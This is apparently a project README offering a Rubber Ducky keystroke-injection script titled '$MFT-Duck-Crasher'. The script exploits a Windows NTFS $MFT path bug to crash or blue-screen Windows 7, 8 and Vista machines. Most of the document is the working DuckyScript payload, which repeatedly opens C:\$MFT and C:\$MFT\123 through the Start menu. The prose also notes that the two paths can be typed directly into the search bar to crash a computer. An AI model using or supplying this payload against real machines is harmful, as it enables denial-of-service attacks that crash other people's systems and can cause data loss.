# -$MFT-Duck-Crasher
A Simple Script for Rubber Ducky which Exploits Windows $MFT Vulnerability
$MFT is used by NTFS systems to manage some metadata.
 This fallace has recently been discovered, which has not yet been closed. Works on windows 7, 8 and vista, dont work on windows 10. I think work on Xp and earlier.
This Script dont require any special firmware on the Rubber Ducky (TwinDuck Firmare etc.).
You can also use this two strings directly on the Windows SearchBar to crash a computer.
The system crash lasts until the machine is switched off, or until the blue screen of death appears;)

A system crash demonstration using the two strings with the following paths: c:\$MFT & c:\$MFT\123 
can be found here:
https://www.youtube.com/watch?v=vYL9UQRwUZc&t=6s






<a href="http://www.youtube.com/watch?feature=player_embedded&v=vYL9UQRwUZc
" target="_blank"><img src="http://img.youtube.com/vi/vYL9UQRwUZc/0.jpg" 
alt="$MFT" width="600" height="450" border="100" /></a> 



$MFT-Duck-Crasher Payload

REM works on w7 - w8 - Vista (and i think xp and earlier too)
REM it uses a high delay to support even older computers
DELAY 1000
CONTROL ESCAPE
DELAY 500
STRING C:\$MFT
DELAY 500
ENTER
DELAY 700
REM the 2nd enter is to close the error
ENTER
DELAY 500
CONTROL ESCAPE
DELAY 500
STRING C:\$MFT\123
DELAY 500
ENTER
DELAY 700
ENTER
DELAY 500
CONTROL ESCAPE
DELAY 500
STRING C:\$MFT
DELAY 500
ENTER
DELAY 700
ENTER
DELAY 500
CONTROL ESCAPE
DELAY 500
STRING C:\$MFT\123
DELAY 500
ENTER
DELAY 700
ENTER
                                                            
